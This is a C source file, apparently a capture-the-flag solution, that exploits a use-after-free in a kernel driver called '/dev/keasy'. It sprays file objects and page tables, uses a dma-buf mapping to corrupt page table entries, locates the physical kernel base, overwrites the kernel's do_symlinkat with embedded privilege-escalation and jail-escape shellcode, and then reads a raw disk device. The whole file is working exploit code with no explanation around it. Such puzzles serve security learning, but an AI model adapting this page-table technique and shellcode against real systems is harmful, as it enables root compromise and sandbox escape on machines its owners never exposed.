#define _GNU_SOURCE
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/xattr.h>
#include <pthread.h>
//#include <linux/dma-heap.h>

#define N_PAGESPRAY 0x200
#define N_SPRAY 0x100
#define DMA_HEAP_IOCTL_ALLOC 0xc0184800

//*
typedef unsigned long long u64;
typedef unsigned int u32;
struct dma_heap_allocation_data {
  u64 len;
  u32 fd;
  u32 fd_flags;
  u64 heap_flags;
};
//*/

void fatal(const char *msg) {
  perror(msg);
  exit(1);
}

void bind_core(int core) {
  cpu_set_t cpu_set;
  CPU_ZERO(&cpu_set);
  CPU_SET(core, &cpu_set);
  sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);
}

unsigned long user_cs, user_ss, user_rsp, user_rflags;

static void save_state() {
  asm(
      "movq %%cs, %0\n"
      "movq %%ss, %1\n"
      "movq %%rsp, %2\n"
      "pushfq\n"
      "popq %3\n"
      : "=r"(user_cs), "=r"(user_ss), "=r"(user_rsp), "=r"(user_rflags)
      :
      : "memory");
}

int fd, dmafd, ezfd = -1;

static void win() {
  char buf[0x100];
  int fd = open("/dev/sda", O_RDONLY);
  if (fd < 0) {
    puts("[-] lose...");
  } else {
    puts("[+] win!");
    read(fd, buf, 0x100);
    write(1, buf, 0x100);
    puts("[+] OK?");
  }
  exit(0);
}

int main() {
  struct dma_heap_allocation_data data;
  void *page_spray[N_PAGESPRAY];
  int file_spray[N_SPRAY];
  int ezfd = -1;
  pthread_t th;
  char buf[0x100] = { 0 };

  bind_core(0);
  save_state();

  int dummy = creat("/jail/test", 0777);
  if (dummy < 0) fatal("/jail/test");
  close(dummy);

  dmafd = creat("/dev/dma_heap/system", O_RDWR);
  if (dmafd < 0) fatal("/dev/dma_heap/system");

  // Open keasy
  fd = open("/dev/keasy", O_RDWR);
  if (fd == -1) fatal("/dev/keasy");

  // Prepare pages
  for (int i = 0; i < N_PAGESPRAY; i++) {
    page_spray[i] = mmap((void*)(0xdead0000UL + i*0x10000UL),
                         0x8000, PROT_READ|PROT_WRITE,
                         MAP_ANONYMOUS|MAP_SHARED, -1, 0);
    if (page_spray[i] == MAP_FAILED)
      fatal("mmap");
  }

  // Spray normal file objects
  puts("[+] Spraying file objects...");
  for (int i = 0; i < N_SPRAY/2; i++) {
    file_spray[i] = open("/jail/test", O_RDONLY);
    if (file_spray[i] < 0) fatal("/jail/test");
  }
  // UAF
  puts("[+] Creating dangling file object...");
  //getchar();
  ezfd = file_spray[N_SPRAY/2-1] + 1;
  if (ioctl(fd, 0, 0xdeadbeef) != -1) // fput called --> UAF
    fatal("ioctl did not fail");
  // Spray 2
  for (int i = N_SPRAY/2; i < N_SPRAY; i++) {
    file_spray[i] = open("/jail/test", O_RDONLY);
    if (file_spray[i] < 0) fatal("/jail/test");
  }

  // Free page for file cache
  puts("[+] Freeing page...");
  for (int i = 0; i < N_SPRAY; i++)
    close(file_spray[i]);

  // Page fault to allocate many PTEs
  for (int i = 0; i < N_PAGESPRAY/2; i++) {
    for (int j = 0; j < 8; j++) {
      *(char*)(page_spray[i] + j*0x1000) = 'A' + j;
    }
  }
  // Allocate dma-buf
  int dma_buf_fd = -1;
  data.len = 0x1000;
  data.fd_flags = O_RDWR;
  data.heap_flags = 0;
  data.fd = 0;
  if (ioctl(dmafd, DMA_HEAP_IOCTL_ALLOC, &data) < 0)
    fatal("DMA_HEAP_IOCTL_ALLOC");
  printf("[+] dma_buf_fd: %d\n", dma_buf_fd = data.fd);
  // Spray 2
  for (int i = N_PAGESPRAY/2; i < N_PAGESPRAY; i++) {
    for (int j = 0; j < 8; j++) {
      *(char*)(page_spray[i] + j*0x1000) = 'A' + j;
    }
  }

  // Increment physical address
  for (int i = 0; i < 0x1000; i++)
    if (dup(ezfd) < 0)
      fatal("dup");

  // Search for victim and target virtual page
  void *target = NULL;
  for (int i = 0; i < N_PAGESPRAY; i++) {
    if (*(char*)(page_spray[i] + 7*0x1000) == 'A') {
      target = page_spray[i] + 0x7000;
      printf("[+] Found target: %p\n", target);
    }
  }
  if (target == NULL) fatal("target not found :(");

  // Remap
  puts("[+] Remapping...");
  getchar();
  munmap(target, 0x1000);
  void *dma = mmap(target, 0x1000, PROT_READ | PROT_WRITE,
                   MAP_SHARED | MAP_POPULATE, dma_buf_fd, 0);
  *(char*)dma = '0';
  getchar();

  // Corrupt dma physaddr
  for (int i = 0; i < 0x1000; i++)
    if (dup(ezfd) < 0)
      fatal("dup");
  printf("[+] Does this look like PTE? --> 0x%016lx\n", *(size_t*)dma);

  // Resolve kernel base
  void *evil = NULL;
  *(size_t*)dma = 0x800000000009c067;
  for (int i = 0; i < N_PAGESPRAY; i++) {
    if (page_spray[i] == target) continue;
    if (*(size_t*)page_spray[i] > 0xffff) {
      evil = page_spray[i];
      printf("[+] Found victim page table: %p\n", evil);
      break;
    }
  }

  size_t phys_base = ((*(size_t*)evil) & ~0xfff) - 0x1c04000;
  printf("[+] Physical kernel base address: 0x%016lx\n", phys_base);

  // Overwrite setxattr
  puts("[+] Overwriting do_symlinkat...");
  size_t phys_func = phys_base + 0x24d4c0;
  *(size_t*)dma = (phys_func & ~0xfff) | 0x8000000000000067;
  char shellcode[] = {0xf3, 0x0f, 0x1e, 0xfa, 0xe8, 0x00, 0x00, 0x00, 0x00, 0x41, 0x5f, 0x49, 0x81, 0xef, 0xc9, 0xd4, 0x24, 0x00, 0x49, 0x8d, 0xbf, 0xd8, 0x5e, 0x44, 0x01, 0x49, 0x8d, 0x87, 0x20, 0xe6, 0x0a, 0x00, 0xff, 0xd0, 0xbf, 0x01, 0x00, 0x00, 0x00, 0x49, 0x8d, 0x87, 0x50, 0x37, 0x0a, 0x00, 0xff, 0xd0, 0x48, 0x89, 0xc7, 0x49, 0x8d, 0xb7, 0xe0, 0x5c, 0x44, 0x01, 0x49, 0x8d, 0x87, 0x40, 0xc1, 0x0a, 0x00, 0xff, 0xd0, 0x49, 0x8d, 0xbf, 0x48, 0x82, 0x53, 0x01, 0x49, 0x8d, 0x87, 0x90, 0xf8, 0x27, 0x00, 0xff, 0xd0, 0x48, 0x89, 0xc3, 0x48, 0xbf, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x49, 0x8d, 0x87, 0x50, 0x37, 0x0a, 0x00, 0xff, 0xd0, 0x48, 0x89, 0x98, 0x40, 0x07, 0x00, 0x00, 0x31, 0xc0, 0x48, 0x89, 0x04, 0x24, 0x48, 0x89, 0x44, 0x24, 0x08, 0x48, 0xb8, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x48, 0x89, 0x44, 0x24, 0x10, 0x48, 0xb8, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x48, 0x89, 0x44, 0x24, 0x18, 0x48, 0xb8, 0x44, 0x44, 0x44, 0x44, 0x44, 0x44, 0x44, 0x44, 0x48, 0x89, 0x44, 0x24, 0x20, 0x48, 0xb8, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x48, 0x89, 0x44, 0x24, 0x28, 0x48, 0xb8, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x48, 0x89, 0x44, 0x24, 0x30, 0x49, 0x8d, 0x87, 0x41, 0x0f, 0xc0, 0x00, 0xff, 0xe0, 0xcc};

  void *p;
  p = memmem(shellcode, sizeof(shellcode),
             "\x11\x11\x11\x11\x11\x11\x11\x11", 8);
  *(size_t*)p = getpid();
  p = memmem(shellcode, sizeof(shellcode),
             "\x22\x22\x22\x22\x22\x22\x22\x22", 8);
  *(size_t*)p = (size_t)&win;
  p = memmem(shellcode, sizeof(shellcode),
             "\x33\x33\x33\x33\x33\x33\x33\x33", 8);
  *(size_t*)p = user_cs;
  p = memmem(shellcode, sizeof(shellcode),
             "\x44\x44\x44\x44\x44\x44\x44\x44", 8);
  *(size_t*)p = user_rflags;
  p = memmem(shellcode, sizeof(shellcode),
             "\x55\x55\x55\x55\x55\x55\x55\x55", 8);
  *(size_t*)p = user_rsp;
  p = memmem(shellcode, sizeof(shellcode),
             "\x66\x66\x66\x66\x66\x66\x66\x66", 8);
  *(size_t*)p = user_ss;

  memcpy(evil + (phys_func & 0xfff), shellcode, sizeof(shellcode));
  puts("[+] GO!GO!");

  printf("%d\n", symlink("/jail/dest", "/jail/test"));

  puts("[-] Failed...");
  close(fd);
  return 0;
}
